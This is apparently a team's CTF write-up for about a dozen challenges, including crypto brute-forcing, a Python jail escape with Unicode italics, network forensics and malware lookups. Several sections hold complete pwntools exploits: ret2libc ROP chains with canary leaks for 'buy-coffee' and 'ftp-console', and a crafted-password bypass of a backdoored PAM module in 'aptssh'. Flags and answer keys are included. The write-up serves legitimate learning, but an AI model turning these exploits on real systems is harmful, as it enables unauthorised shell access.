# conv

Just brute-force it.

```Python
import itertools

key = b'\xab\xec\xe9<\xaaC\x7fr\xeb\x8dgQ\xc0\x94\x01\x1d\xc03\x14\x97\xe2\x91\x97\xcf\x8b\x13?\x1d24w|'
ciphertext_hex = "17c080c00398a06e4661e403b2b571b578221bba83e235a0feece7213ad4d65c1d89c2a3afae5ef91bf7f2181f0c797505b7bd55c62d1edf2614b17f88f85eac674fbd6d7be4e2a617605c68e1baf8603cb9b1d32b2bc1ab60d8c62b20be0bc0fb73a546b5641988a3bf8eeb778731e048970308d941a8bd5f6cb56159069364c93b5429afdb85f9dfb5f5b0ca44d314af68bc9d56b39321fe5cc072c9508978693ee60a9bffff5b52f6aa0ca37f9b421eb402a4886b742570926b7479d2b89528caceb7121a338c233164c33a120b9813bc56b855c914124ecb30df3d4a14c92788faa7c9e32b544e24d9d9fe2a5539a280c28466dc6b276ba4b089fa26f8bace95f43f6c5d491e14e5fa09a853fff2dfd73a8cf8d7b54d3d8d693db7b182789f47e343e9cf56f8663e181a1e98276aface8b1052e3ee9c6630d69ad479bfe1106ec1ab585a030ca130a6d849f9c4bed9d0b16f46890f1efa66c8f21f078088f426ef0e1f9af315ae3b2356123df174bb4095ad2361237bedc3e62c294f8ccc135f9766f0ec2a462087cd2648"
ciphertext = bytes.fromhex(ciphertext_hex)

def conv(array1: bytes, array2: bytes) -> bytes:
    len1, len2 = len(array1), len(array2)
    res = [0] * (len1 + len2 - 1)
    for i in range(len1 + len2 - 1):
        csum = 0
        for j in range(max(0, i - len2 + 1), min(len1, i + 1)):
            csum += array1[j] * array2[i - j]
        res[i] = csum % 256
    return bytes(res)

def brute_force_plaintext(ciphertext: bytes, key: bytes):
    flag_guess = []
    charset = list(range(32, 127))

    for i in range(0, len(ciphertext) - len(key) + 1):
        for guess in charset:
            candidate = bytes(flag_guess + [guess])
            if conv(candidate, key)[:len(candidate)] == ciphertext[:len(candidate)]:
                flag_guess.append(guess)
                print(f"Guessed so far: {bytes(flag_guess).decode('ascii', errors='replace')}")
                break
        else:
            print(f"Match not found at position {i}.")
            break

    return bytes(flag_guess)

brute_forced_flag = brute_force_plaintext(ciphertext, key)
print("Final flag:", brute_forced_flag.decode('ascii', errors='replace'))

```

FLAG: `CTF{89c5cce663fce1500d22c2ef5112dc2885c491d37d3503118251bdd516b4dcc0}`

# pyterm

Tried a lot of basic python jailbreak stuff, but seems like all is blacklisted. Then, I stumbled upon this: https://ctftime.org/writeup/38733. It says that python normalizes special fonts so we can use italics to bypass the filters. Good italic text is obtained from here: https://lingojam.com/ItalicTextGenerator

Then, list files in the current directory and read the flag:

```Python
𝘱𝘳𝘪𝘯𝘵(__𝘪𝘮𝘱𝘰𝘳𝘵__('os').𝘭𝘪𝘴𝘵𝘥𝘪𝘳('.'))
𝘱𝘳𝘪𝘯𝘵(𝘰𝘱𝘦𝘯(𝘤𝘩𝘳(102) + 𝘤𝘩𝘳(108) + 𝘤𝘩𝘳(97) + 𝘤𝘩𝘳(103) + ".py").𝘳𝘦𝘢𝘥())
```

FLAG: `CTF{c54f60751af79f92fd93a3a2f78eb2461e8ce614c879a1bb85fb1c0e32bd7ec3}`

# buy-coffee

We are provided a libc, so most likely there will be a `ret2libc` attack to be done.

Analyzing the code of the binary given, we see it's quite simple yet very vulnerable.
```C++
void coffee(void)

{
  long in_FS_OFFSET;
  char local_28 [24];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  printf("Coffee Time\n$ ");
  gets(local_28);
  printf(local_28);
  printf("What is this? %p\n",printf);
  printf("\nCoffee Time\n$ ");
  fread(local_28,1,0x50,stdin);
  puts(local_28);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
    __stack_chk_fail();
  }
  return;
}
```

It has a format string vulnerability (reads our input via `gets` and uses `printf` on it with no filters), and also a buffer overflow (`fread` of `0x50` bytes into a buffer of `0x18` bytes). We also get the libc address of `printf`, so we can easily calculate the addresses of `system` and the `/bin/sh` string with the provided libc. Also, it has a stack canary, which we can leak via the format string.

Analyzing it further, there are quite a few of functions named `ROPME`, `ROPMEE` and so on, which are basically just ROP gadgets.

```asm
endbr64
push rbp
mov rbp, rsp ; prologue
push rax
pop rax
nop
pop rbp ; epilogue
ret
```

Using checksec, we see that the binary has PIE enabled, meaning that functions will change address at runtime, so we have to also leak a normal address and calculate the address of one such ROP function at runtime.

By using GDB to debug this file and test some inputs, we see that the canary is at position 9 on the stack, and the return address (return the main after `coffee` function call) is on position 11, thus our format string input will be `%9$p %11$p`.
From there, it's just a matter of keeping the stack aligned and building the ROP chain. We get the `printf` leak and get the addresses of `system` and `/bin/sh`, and then use a `pop rdi` gadget to get the address of `/bin/sh` into RDI (argument for `system`). For the `pop rdi` gadget address, I've just calculated the difference from where the function would return to where that function is located in the binary and used that to get its address.

```Python
from pwn import *

libc = ELF('./libc-2.31.so')
p = remote("34.159.103.1", 30889)
#p = gdb.debug('./chall', '''
#set follow-fork-mode child
#b main
#c
#''')

print(p.recvline())
p.sendline(b"%9$p %11$p")
line = p.recvline()
print(line)
canary = int(line.decode().split("W")[0].split("$")[1].split(" ")[1].strip(), 16)
log.success(f'Got canary: {hex(canary)}')

main_addr = int(line.decode().split("W")[0].split("$")[1].split(" ")[2].strip(), 16)
log.success(f'Got main: {hex(main_addr)}')

pop_rdi = main_addr - 0x10f # offset to get from the return to main into the pop rdi gadget
log.success(f'Calculated gadget: {hex(pop_rdi)}')

printf_addr = int(line.decode().split("?")[1].strip(), 16)
log.success(f'Got printf leak: {hex(printf_addr)}')

libc_base = printf_addr - libc.symbols["printf"]
log.success(f'Calculated libc base: {hex(libc_base)}')

system_addr = libc_base + libc.symbols["system"]
log.success(f'system address: {hex(system_addr)}')

binsh_addr = libc_base + next(libc.search(b'/bin/sh'))
log.success(f'/bin/sh address: {hex(binsh_addr)}')

print(p.recvline())
print(p.recvline())

payload = b"A" * 24
payload += p64(canary)
payload += p64(0)
payload += p64(pop_rdi)
payload += p64(binsh_addr)
payload += p64(0) # pop_rdi offset also does pop rbp, so we just put 0 in there
payload += p64(system_addr)
payload += p64(0) # filler to make it to 0x50 bytes for fread

p.sendline(payload)
p.interactive()

```

FLAG: `CTF{b5d4efc30c05420acb161eb92e120a902187d9710b297fba36d42528ea4ae09d}`

# rerdp

Analyzing the provided PCAP, we see a lot of `TCP` fragments being thrown around, and some `HTTP` requests. The `HTTP` requests provide 4 PDFs, which are completely benign. Apart from the 4 PDFs, there are 2 more `POST` requests which are quite interesting. One contains some data related to `RDP`, and one contains the following: 

```PCAP
CLIENT_RANDOM 3a59c211663a5bffe1d7c216ec5fd10db830043423cc8384aa522baf55622c73 9bedb2b2685c2e6fb82a3e6a23fe7e9407d9a8bcf5417ee49b02b8cc6edb4316ec90fe37dcc0171378e8fd790ad9c307
CLIENT_RANDOM e4dddc52093aaa44867506e88f778737dcae9da4e297093c678049ef80136b1f 2e080bdc8fdc85862b185b3ad0a24f050d6576a520eb154afa0dcaf286daa420230d4914d101916c3c44c33819cff420
```

That is similarly looking to the format for SSL_KEY_LOG file, and thus we can use it to decrypt our `TLS` traffic. However, in the current format of the PCAP, Wireshark doesn't recognize the packets how it should. For that, I opened the PCAP in Network Miner and got the file rearranged with all the RDP packets. 
From there, save that CLIENT_RANDOMs in a file and fed it for the Pre-Master Secret logfile in TLS for Wireshark to decrypt it. And voila, we have decrypted RDP communications.

From here, I looked a bit around searching on what to do that, and found this (`https://res260.medium.com/ihack-2020-monster-inc-the-middle-rdp-network-forensics-writeup-91e2fb0f4287`) article which mentions the tool `pyrdp`, allowing you to convert a PCAP of `RDP` communications to an actual replay. So I used `pyrdp-convert` to convert the PCAP to a `pyrdp` file, and then `pyrdp-player` to replay the file. In the replay, we can see them visiting a short link which gets us the flag (`shorturl.at/wSHkd`).

FLAG: `ctf{1eaa9d65d69a92b75e6cbc68ea78e346ad0452b1a2931aba4a530ee1a3f04dad}`

# aptssh

Right off, we are notified that we can login via ssh with `aptssh:aptssh` because of a backdoored PAM (Pluggable Authentication Module) module. Using these credentials, we are given two `base64` strings. Decoding the 2 strings, we see that they are indeed 2 `ELF` files.
Opening the first and analyzing it, we see that it is indeed a PAM module, and the `pam_sm_authenticate` function shows us what happens when you login with `aptssh:aptssh`, and that is that it outputs 2 files as `base64`, namely `/lib/security/pam_passfile.so` and `pam_passfile.o`.

At first, I went after the idea that one of the modules is backdoored, and the other one is the normal one, but after doing some analysis of the two files by using `diff` with the text outputs from `objdump -d` and `readelf -a`, I came to the conclusion that the only difference was that one was a shared object file with dynamic GOT/PLT linkage, and the other one is the same file but in the relocatable file form.

After ensuring that both `pam_sm_authenticate` functions do the same thing (static analysis in IDA of all functions to make sure they all do the same thing), I went on a thorough analysis of the function to see how we would bypass it, given the fact that we need to authenticate somehow and get on the machine to get the flag.

There are two main ways of authentication present there, one is by checking a locally stored password for the `sshuser` user:
```C++
if ( strcmp(unameBuf, "sshuser") )
  {
    v11 = 10000;
    do
      v11 -= 8;
    while ( v11 );
    return 10;
  }
  v6 = fopen("/home/sshuser/pass.txt", "r");
  v7 = v6;
  if ( !v6 )
    return 7;
  if ( !fgets(s, 100, v6) )
  {
    fclose(v7);
    v12 = 10000;
    do
      v12 -= 8;
    while ( v12 );
    return 7;
  }
  fclose(v7);
  v8 = strcspn(s, "\n");
  v9 = pwdBuf;
  s[v8] = 0;
  result = strcmp(v9, s);
  if ( result )
    return 7;
  return result;
```

And the other one is more peculiar:
```C++
pam_casual_auth(&v13);
if ( strlen(pwdBuf) > 0x64 )
  {
    v5 = 7000;
    do
      v5 -= 8;
    while ( v5 );
    s2 = 0xADC29EC3;
    v18 = 0xAFC3;
    v17 = v13;
    s[0] = 0;
    result = memcmp(pwdBuf + 100, &s2, 9uLL);
    if ( !result )
    {
      v10 = 10000;
      do
        v10 -= 8;
      while ( v10 );
      return result;
    }
  }
```

Seeing as how we have no way to get on the machine, I abandoned the first method and started looking at how I can bypass the second one. At first glance, our password would have to be at least 100 characters, and we would have to guess 5 bytes (2^40 options), as `memcmp` compares 9 bytes from the 101st character in our password with the bytes starting at the address of `s2`. Looking further into the stack arrangement of `s2`, we see this:
```C++
  int result; // eax
  int v4; // r10d
  int v5; // eax
  FILE *v6; // rax
  FILE *v7; // rbp
  size_t v8; // rax
  char *v9; // rdi
  int v10; // r9d
  int v11; // r8d
  int v12; // edi
  __int16 v13; // [rsp+16h] [rbp-112h] BYREF
  char *unameBuf; // [rsp+18h] [rbp-110h] BYREF
  char *pwdBuf; // [rsp+20h] [rbp-108h] BYREF
  int s2; // [rsp+28h] [rbp-100h] BYREF
  __int16 v17; // [rsp+2Ch] [rbp-FCh]
  __int16 v18; // [rsp+2Eh] [rbp-FAh]
  char s[16]; // [rsp+30h] [rbp-F8h] BYREF
  int v25; // [rsp+90h] [rbp-98h]
  char v26[136]; // [rsp+A0h] [rbp-88h] BYREF
```

This tells us that after `s2`, in memory, we will have `v17`, followed by `v18` and then `s`. We already have the value of `v18` and also know the first byte of `s` since it is set (second code snippet), so at this point we would have to guess only 2 bytes (2^16 options - manageable). However, if we look just above the `if` in the second code snippet, we can see a call to `pam_casual_auth` where `v13` is being passed as an argument, and further down the line `v17` is assigned `v13`. Analyzing that function, we get:

```C++
__int64 __fastcall pam_casual_auth(_WORD *a1)
{
  __int64 result; // rax

  result = 0xFFFFBEC2LL;
  *a1 = 0xBEC2;
  return result;
}
```

And with that, we get our final 2 bytes, meaning that we have all 9 bytes required for the check, and thus we can move further and login as `sshuser` (I tried first with root and it errored, so I reverted to something that was already there). We just need to make a quick python script that would login via `ssh` with `sshuser` username and a password which has gibberish for the first 100 characters, and from there it has the bytes required to bypass the check, namely `CE 9E C2 AD` (`s2` in little-endian) `C2 BE` (`v17` in little-endian) `C3 AF` (`v18` in little-endian) and `00` (first byte of `s`).

```Python
from pwn import *

password = b"A" * 100 + b"\xC3\x9E\xC2\xAD\xC2\xBE\xC3\xAF\x00"
try:
    ssh_conn = ssh(host="35.246.161.148", port=32531, user="sshuser", password=password)
    ssh_conn.interactive()
except Exception as e:
    print(f"Failed: {e}")

```

FLAG: `ctf{ba1e7756b2a842641357e840b47a477924b8deb0078e715754247453abb587be}`


# oracle-srl

Flag in the the source code of the challenge.

# siem-logs

q1, q2 - search for queries related to domains containing student, and then get dns queries to it and get the ip => `q1-103.53.43.239`, `q2-studentvisaconsultantsdelhi`

q3 - search for queries made by that domain and you'll see requests such as `GET /wp-login.php` => `q3-wordpress`

# i-got-a-virus

search it on VT by sha256 hash and answer questions from there

`q1 - 4c1dc737915d76b7ce579abddaba74ead6fdb5b519a1ea45308b8c49b950655c` 
`q2 - petya`
`q3 - trojan` (petya is ransomware but w/e)
`q4 - 2016-01-30 02:56:43 UTC`
`q5 - 13.107.4.52`

# call-me-pliz

download the logs and search for `keylogger` keyword
after identifying that the malware is anubis, search for it instead and look for the answers

`q1 - SuperSecureP@ssw0rd`
`q2 - 95.173.136.70`
`q3 - google play protect`

# alternating

using winrar to open the archive fails due to ADS (Alternate Data Streams) usage (yay windows)
use `7z` instead and get the flag

`FLAG: ctf{7ce5567830a2f9f8ce8a7e39856adfe5208242f6bce01ca9af1a230637d65a2d}`

# forensics-disk

open all 3 images with FTK imager and get the flag

`FLAG: CTF{232293r-32dcvg33-beskdkfe}`

# ctr - POST-CTF

You are given a list of 69 encrypted flag parts, most likely AES-CTR (given the chall's name). Then, an IP is given, and it asks you to give some input, and spits out that input encrypted.

Spent lot of time on it and gotten lots of key ciphers and tried various things and patterns and XORs and brute forces, but nothing, as I thought that key cipher one would decrypt first encrypted flag part :(

Apparently, you had to generate key ciphers up to ~130 (XOR the output given by the encryption of our input with the input itself since encryption was AES-CTR). Then, you had to try each key cipher on the encrypted flag parts, and you'd see that the "id" of the key cipher that decrypts correctly (XOR that key cipher with the encrypted flag part) the first flag part was the 67th, and `chr(67) = 'C'`. So you'd have to just check for successful decryption of the flag parts (in order) and get the number of the key cipher that did it, and run that through `chr`.

```Python
from pwn import *

def is_ascii(s):
    return all(ord(c) < 128 for c in s)

lines = open("ctr.txt").readlines()

io = remote("35.246.144.124", 31245)
io.recvline()

keys = []
for i in range(128):
  io.sendline(b"\x00"*16)
  out = io.recvline()
  out = out.split(b" ")[-1].strip()
  print("out:",out)
  a = xor(bytes.fromhex(out.decode()), b"\x00"*16)
  keys.append(a)
  io.clean(timeout=0.2)
io.close()

flag = ""
for x in range(69):
  for j in range(128):
    result = xor(bytes.fromhex(lines[x].strip()), keys[j])
    try:
      if is_ascii(result.decode()):
        print("xor:",result, j)
        flag += chr(j+1)
        break
    except Exception as e:
      pass
print("flag:",flag)
```

# ftp-console - POST-CTF

Another one for which I spent a lot of time. Simple buffer overflow with a leak for `system`, but no `/bin/sh`. 
I tried using `libc-database` to get the correct `libc` and get the offset for `/bin/sh` and tried various mechanisms for writing `/bin/sh` somewhere, but to no avail.
Apparently in order to get the correct `libc` you had to also leak another function, because just with one leak it doesn't produce good outputs :(. And from there it would just be a simple call to `system` via the buffer overflow.

```Python
from pwn import *

r = remote("34.107.40.88", 31124)
elf = context.binary = ELF("./ftp")
libc = ELF("./libc6_2.35-0ubuntu3.7_i386.so")
r.sendlineafter(b"USER ", b"a")
leak = r.recv().split(b" ")[-2].split(b"\n")[0]
leak = int(leak.decode()[2:], 16)
libc.address = leak - libc.sym["system"]
payload = b"a" * 80
payload += p32(libc.sym["system"])
payload += p32(0)
payload += p32(libc.address + 0x1bd0d5)
r.sendline(payload)
r.interactive()
```

Leaking puts:

```Python
from pwn import *

context.binary = elf = ELF('./ftp_server')
p = remote(<ip>,<port>)
#libc = ELF('./libc.so.6')

p.recv()
p.sendline(b'a')
p.recvline()
p.recvline()
p.recvline()
system = int(p.recvline().split()[-1], 16)

payload =  b"\x90"*80 + p32(elf.plt.puts) + p32(0) + p32(elf.got.puts)

p.sendline(payload)
p.interactive()
```